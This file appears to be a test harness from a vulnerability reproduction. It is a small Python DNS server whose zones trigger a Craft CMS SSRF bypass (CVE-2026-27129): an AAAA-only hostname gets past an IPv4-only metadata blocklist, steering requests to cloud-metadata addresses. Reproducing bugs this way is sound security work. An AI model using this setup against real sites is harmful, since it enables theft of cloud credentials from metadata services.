#!/usr/bin/env python3
"""Static A/AAAA responder for craft-cms-cve-2026-27129 (CVE-2026-27129 IPv6-resolution SSRF bypass).

A tiny dependency-free UDP DNS server whose zones reproduce the EXACT resolver asymmetry that
CVE-2026-27129 exploits in Craft's CVE-2025-68437 fix. The 5.8.22 guard calls PHP
``gethostbyname($host)`` — which performs an IPv4-ONLY (A-record) lookup — and compares the
result against an IPv4 cloud-metadata blocklist. For a hostname that has ONLY an AAAA (IPv6)
record and NO A record, ``gethostbyname`` fails and PHP returns the *unmodified hostname string*,
which of course never matches the numeric IPv4 blocklist, so validateHostname() passes. libcurl
(the Guzzle fetch) then resolves the AAAA via getaddrinfo and connects to the IPv6 metadata
endpoint. That is the whole bug: a static, single-resolution, IPv4-only-resolver blind spot —
NOT a temporal rebind (that is the sibling CVE-2026-27127).

Zones:
  seed.pcb.test   A  -> 192.0.0.192  (Oracle cloud-metadata IPv4, in Craft's blocklist)   [CVE-2025-68437 seed]
                  AAAA -> NODATA
  host6.pcb.test  A  -> NODATA (name EXISTS, no A record => gethostbyname returns the string)
                  AAAA -> fd00:ec2::254  (AWS IMDS-style IPv6 metadata canary)             [CVE-2026-27129 residual]
  anything else   -> NODATA / NXDOMAIN

NODATA (RCODE 0, ANCOUNT 0, name exists) — NOT NXDOMAIN — is essential for host6's A query: it
makes gethostbyname fail cleanly (so PHP returns the hostname verbatim) while getaddrinfo still
resolves the AAAA. Returning NXDOMAIN for A would also kill the AAAA lookup in libcurl.
"""
import socket
import struct
import sys

A_ZONE = {
    "seed.pcb.test": "192.0.0.192",   # CVE-2025-68437 seed: static IPv4 metadata IP (blocklisted)
}
AAAA_ZONE = {
    "host6.pcb.test": "fd00:ec2::254",  # CVE-2026-27129 residual: AAAA-only metadata canary
}
KNOWN = set(A_ZONE) | set(AAAA_ZONE)


def _parse_qname(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        labels.append(data[offset + 1: offset + 1 + length].decode("ascii", "replace"))
        offset += 1 + length
    return ".".join(labels), offset


def _build_response(data):
    tid = data[:2]
    flags = 0x8180  # standard query response, no error (RCODE 0)
    offset = 12
    qname, offset = _parse_qname(data, offset)
    qtype, qclass = struct.unpack(">HH", data[offset: offset + 4])
    offset += 4
    question = data[12:offset]
    q = qname.lower().rstrip(".")

    answer = b""
    if qtype == 1 and q in A_ZONE:          # A
        answer = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 0, 4) + socket.inet_aton(A_ZONE[q])
        role = f"A -> {A_ZONE[q]}"
    elif qtype == 28 and q in AAAA_ZONE:     # AAAA
        rd = socket.inet_pton(socket.AF_INET6, AAAA_ZONE[q])
        answer = b"\xc0\x0c" + struct.pack(">HHIH", 28, 1, 0, 16) + rd
        role = f"AAAA -> {AAAA_ZONE[q]}"
    else:
        # Name exists but not this type => NODATA (RCODE 0, ANCOUNT 0). For host6's A query this
        # is what makes PHP gethostbyname return the hostname string (the CVE-2026-27129 trigger).
        role = "NODATA" if q in KNOWN else "NXDOMAIN/NODATA"

    qtname = {1: "A", 28: "AAAA"}.get(qtype, str(qtype))
    print(f"[dns] {q} {qtname} -> {role}", flush=True)
    ancount = 1 if answer else 0
    header = tid + struct.pack(">HHHHH", flags, 1, ancount, 0, 0)
    return header + question + answer


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 53))
    print("[dns] static A/AAAA responder up on 0.0.0.0:53", flush=True)
    while True:
        try:
            data, addr = sock.recvfrom(512)
            if len(data) < 12:
                continue
            sock.sendto(_build_response(data), addr)
        except Exception as e:  # noqa: BLE001
            print(f"[dns] error: {e}", file=sys.stderr, flush=True)


if __name__ == "__main__":
    main()
